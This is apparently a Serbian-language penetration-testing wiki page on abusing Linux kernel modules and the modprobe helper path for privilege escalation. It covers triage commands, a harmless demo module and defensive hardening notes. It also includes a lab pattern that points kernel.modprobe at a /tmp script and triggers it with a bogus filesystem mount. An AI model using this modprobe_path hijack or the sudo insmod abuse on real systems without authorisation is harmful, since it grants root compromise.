# Zloupotreba Kernel Modules i modprobe

{{#include ../../banners/hacktricks-training.md}}

## Pogrešne konfiguracije Kernel module i učitavanja modula

Podrška za Kernel module je oblast visokog uticaja tokom pregleda Linux privilege escalation-a. Nemojte svaku poruku o nepotpisanom modulu automatski smatrati eksploatabilnom, već je koristite za dobijanje odgovora na praktična pitanja.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Da li trenutni korisnik može da učitava module putem `sudo`, capabilities-a ili writable helper putanje?
- Da li je učitavanje modula i dalje omogućeno?
- Da li je provera potpisa modula onemogućena?
- Da li su direktorijumi modula ili fajlovi modula writable?
- Da li se kernel logovi mogu čitati radi potvrde onoga što se dogodilo?

Brza trijaža počinje sledećim proverama statusa modula, potpisa, logovanja i stabla modula.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Tumačenje:

- `modules_disabled=1` znači da se moduli ne mogu ni učitati ni ukloniti, a vrednost se ne može vratiti na `0` do ponovnog pokretanja sistema.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` u kernel komandnoj liniji ili `CONFIG_MODULE_SIG_FORCE=y` zahteva validno potpisane module; u suprotnom, nepotpisani moduli mogu da se učitaju i označe kernel kao tainted.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` ne nameće nikakva ograničenja za `dmesg`; kada je vrednost `1`, pristup zahteva `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Putanje sa dozvolom upisivanja unutar `/lib/modules/$(uname -r)/` su opasne zato što `modprobe` pretražuje to stablo i podatke o zavisnostima prilikom učitavanja modula.<sup>[[8]](#references)</sup>

### Učitavanje modula i čitanje kernel izlaza

Ako imate legitimnu dozvolu da učitate lokalni modul, `insmod` umeće tačnu `.ko` datoteku koju navedete. Init funkcija modula se izvršava kao deo učitavanja, a poruke zapisane pomoću `printk()` odlaze u kernel bafer dnevnika, koji se obično čita pomoću `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimalni postupak provere koristi `modinfo` za pregled metapodataka, `insmod` i `rmmod` za učitavanje i uklanjanje modula, `lsmod` za potvrdu stanja učitanosti, a `dmesg` za pregled kernel dnevnika.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Ako `sudo -l` dozvoljava `insmod`, `modprobe` ili omotač oko njih, tretirajte to kao kritično: `sudo -l` navodi privilegije korisnika koji ga poziva, a učitavanje kernel modula zahteva `CAP_SYS_MODULE`.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` dozvoljen preko sudo

sudo pravilo koje korisniku dozvoljava pokretanje komande `insmod` nije uporedivo sa dozvoljavanjem uobičajenog administrativnog pomoćnog programa. Inicijalizacioni kod modula izvršava se u sklopu ubacivanja, pa je praktično pitanje za proveru da li ovaj korisnik može da izabere ili izmeni modul koji se učitava.<sup>[[3]](#references)</sup>

Sledeći generički tok provere ponavlja kontrole inspekcije, učitavanja, stanja, logova i uklanjanja za kandidatski modul.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Ako korisnik može da obezbedi proizvoljan `.ko`, pravilo treba tretirati kao potpunu kompromitaciju sistema u okviru ovlašćene procene. Bezbedniji operativni obrazac jeste izbegavanje delegiranja učitavanja modula kroz sudo; ako je to neizbežno, ograničite tačnu putanju, vlasništvo, dozvole, politiku potpisivanja i proceduru uklanjanja.<sup>[[3]](#references)[[10]](#references)</sup>

Za bezopasan obrazac izgradnje modula u kontrolisanoj laboratoriji, u nastavku su prikazani minimalni izvorni kod i Makefile; oblik `make -C /lib/modules/$(uname -r)/build M=$PWD` prati dokumentovani kernel kbuild postupak za eksterne module.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Izgradnju i učitavanje obavljajte isključivo u autorizovanoj laboratoriji; kbuild izgrađuje eksterni modul, a komande za učitavanje/uklanjanje pozivaju interfejse kernel modula.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Provere zloupotrebe `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` navodi userspace pomoćni program koji kernel izvršava za zahteve za automatsko učitavanje modula; ovaj sysctl utiče na automatsko učitavanje, a ne na eksplicitno umetanje modula. Ako napadač može da ga promeni tako da pokazuje na izvršnu datoteku sa mogućnošću upisivanja i pokrene zahtev za modulom, taj pomoćni program postaje privilegovani put za izvršavanje koda.<sup>[[1]](#references)</sup>

Proverite trenutnu putanju pomoćnog programa putem kernel sysctl interfejsa i proverite vlasništvo i režim pristupa cilja.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Proverite da li je moguće uticati na sysctl, delegirana sudo pravila ili capabilities fajlova.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Sledeći obrazac je namenjen isključivo laboratoriji, menja putanju pomoćnika i pokreće dokumentovani zahtev za automatsko učitavanje modula; koristite ga samo na izolovanom, autorizovanom sistemu.<sup>[[1]](#references)</sup>

Na aktuelnim Linux kernelima nemojte koristiti nepoznatu izvršnu datoteku kao generički okidač: nasleđeno automatsko učitavanje modula za prilagođene binarne formate uklonjeno je u Linuxu 6.14, dok dokumentacija kernela navodi nepoznat tip filesystema kao putanju zahteva za automatsko učitavanje modula.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Na hardened sistemima, ovo bi trebalo da ne uspe kada dozvole sprečavaju neprivilegovane upise u `kernel.modprobe`, putanja pomoćnog programa nije upisiva ili je automatsko učitavanje modula onemogućeno.<sup>[[1]](#references)</sup>

### Pregled upisivog direktorijuma `/lib/modules`

Upisivi direktorijumi modula mogu omogućiti zamenu modula, postavljanje zlonamernih modula ili zloupotrebu automatskog učitavanja, u zavisnosti od toga kako se `modprobe` kasnije poziva; `modprobe` pretražuje `/lib/modules/$(uname -r)` i koristi podatke o zavisnostima prilikom razrešavanja modula.<sup>[[8]](#references)</sup>

Pregledajte upisive datoteke modula i metapodatke o zavisnostima/aliasima u stablu modula aktivne kernel verzije.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Ako pronađete sadržaj modula sa dozvolom za upis, proverite kako `modprobe` rešava zavisnosti i kako `modinfo` prikazuje metapodatke modula.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Defanzivne napomene:

- Održavajte da `/lib/modules` bude u vlasništvu `root:root` i da korisnici nemaju dozvolu upisivanja.<sup>[[8]](#references)</sup>
- Postavite `kernel.modules_disabled=1` nakon pokretanja sistema gde je to operativno moguće.<sup>[[1]](#references)</sup>
- Primenite potpisivanje modula na sistemima koji zahtevaju module koji se mogu učitati.<sup>[[2]](#references)</sup>
- Nadgledajte upisivanja u `/proc/sys/kernel/modprobe`, `/lib/modules` i neočekivano izvršavanje `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)</sup>

## References

- [1] [Dokumentacija za /proc/sys/kernel/ — Dokumentacija Linux kernela](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Funkcija potpisivanja kernel modula — Dokumentacija Linux kernela](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Osnove drivera — Dokumentacija Linux kernela](https://docs.kernel.org/driver-api/basics.html)
- [6] [Beleženje poruka pomoću printk — Dokumentacija Linux kernela](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Izgradnja eksternih modula — Dokumentacija Linux kernela](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Spoji oznaku 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/getcap.8.html)
{{#include ../../banners/hacktricks-training.md}}
